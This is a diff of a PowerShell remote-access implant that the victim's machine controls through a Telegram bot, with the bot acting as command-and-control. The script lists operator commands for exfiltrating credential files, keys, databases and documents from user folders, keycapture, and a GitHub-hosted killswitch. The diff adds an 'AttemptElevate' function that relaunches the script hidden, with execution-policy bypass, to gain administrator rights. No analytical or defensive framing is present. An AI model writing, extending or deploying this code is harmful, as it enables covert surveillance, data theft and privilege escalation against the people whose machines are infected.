@@ -26,7 +26,7 @@ if(Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"){
 Sleep 15
 }
 
-# remove pause file
+# remove pause files
 if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.vbs"){
 rm -path "$env:APPDATA\Microsoft\Windows\temp.ps1" -Force
 rm -path "$env:APPDATA\Microsoft\Windows\temp.vbs" -Force
@@ -52,12 +52,15 @@ Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
 #----------------------------------------------- ACTION FUNCTIONS -------------------------------------------------
 
 Function Options{
-Start-Sleep 1
 $contents = "==============================================
 ========= $comp Telegram C2 Options List $comp ========
 ==============================================
+
+==============================================
 ============= $cmde Commands List $cmde ============
 ==============================================
+
+ExtraInfo    : Extra commands information
 Close   : Close this Session
 PauseSession   : Kills this session and restarts
 FolderTree    : Gets Dir tree and sends it zipped
@@ -70,16 +73,39 @@ Softwareinfo   : Send Software info as text file
 Historyinfo   : Send History info as text file
 RemovePersistance   : Remove Startup Persistance
 IsAdmin   : Checks if session has admin Privileges
-==============================================
+AttemptElevate  : Send user a prompt to gain Admin  
+=============================================="
+
+$params = @{chat_id = $ChatID ;text = $contents}
+Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
+}
+
+
+Function ExtraInfo{
+$contents = "==============================================
 ============ $glass Examples and Info $glass ===========
 ==============================================
+
 =========  Exfiltrate Command Examples ==========
-( PS`> Exfiltrate -path Documents -filetype png )
-( PS`> Exfiltrate -filetype log )
+
+( PS`> Exfiltrate -Path Documents -Filetype png )
+( PS`> Exfiltrate -Filetype log )
 ( PS`> Exfiltrate )
 Exfiltrate only will send many pre-defined filetypes
 from all User Folders like Documents, Downloads etc..
-========= To Exit Exiltrate or Keycapture =========
+
+PATH
+Documents, Desktop, Downloads,
+OneDrive, Pictures, Videos.
+
+FILETYPE
+log, db, txt, doc, pdf, jpg, jpeg, png,
+wdoc, xdoc, cer, key, xls, xlsx,
+cfg, conf, docx, rft.
+
+======== Using the Killswitch Function ========
+
+(Used for KeyCapture and Exfiltrate commands)
 set `$GHurl to an empty text file RAW url on github.
 Changing this file to contain the word 'True'
 will exit the current fuction and then
@@ -87,10 +113,13 @@ the script will return to listen for further commands
 (can take a few mins to kill - be paitient..)
 To set URL from here type `$GHurl = 'YOUR_TEXTFILE_URL' 
 into the chat (before invoking the function!)
+
 =============================================="
+
 $params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
 }
+
 
 Function Close{
 $contents = "$comp $env:COMPUTERNAME $closed Connection Closed"
@@ -378,7 +407,7 @@ Remove-Item -Path $FilePath -Force
 }
 
 Function ShowButtons{
-$messagehead = "Click 'Enter Commands' To Enter Commands in Chat"
+$messagehead = "Press a Button to Continue"
 $inlineKeyboardJson = @"
 {
     "inline_keyboard": [
@@ -409,7 +438,7 @@ while ($killint -eq 0) {
     $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset" -Method Get
     foreach ($update in $updates.result) {
         $offset = $update.update_id + 1
-        sleep 1
+        Sleep 1
         if ($update.callback_query.data -eq "button_clicked") {
             $killint = 1
         }
@@ -418,9 +447,9 @@ while ($killint -eq 0) {
             Options
         }
     }
-    Start-Sleep -Seconds 2
+    Sleep 1
 }
-$contents = "$comp $env:COMPUTERNAME $tick Ready for Commands"
+$contents = "$comp $env:COMPUTERNAME $tick Session Started"
 $params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
 }
@@ -463,7 +492,6 @@ rm -path "$env:TEMP\temp.ps1" -Force
 exit
 }
 
-
 Function IsAdmin{
 If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
 $contents = "$closed Session NOT Admin $closed"
@@ -478,6 +506,12 @@ Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
 }
 
 
+Function AttemptElevate{
+if(!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
+    Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W Hidden -File `"{0}`"" -f $PSCommandPath) -Verb RunAs
+    }
+}
+
 # --------------------------------------------- TELEGRAM FUCTIONS -------------------------------------------------
 
 
@@ -485,7 +519,7 @@ Function IsAuth{
 param($CheckMessage)
     if (($messages.message.date -ne $LastUnAuthMsg) -and ($CheckMessage.message.text -like $PassPhrase) -and ($CheckMessage.message.from.is_bot -like $false)){
         $script:AcceptedSession="Authenticated"
-        $contents = "$comp $env:COMPUTERNAME $tick Session Starting"
+        $contents = "$comp $env:COMPUTERNAME $tick Session Starting.."
         $params = @{chat_id = $ChatID ;text = $contents}
         Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
         ShowButtons
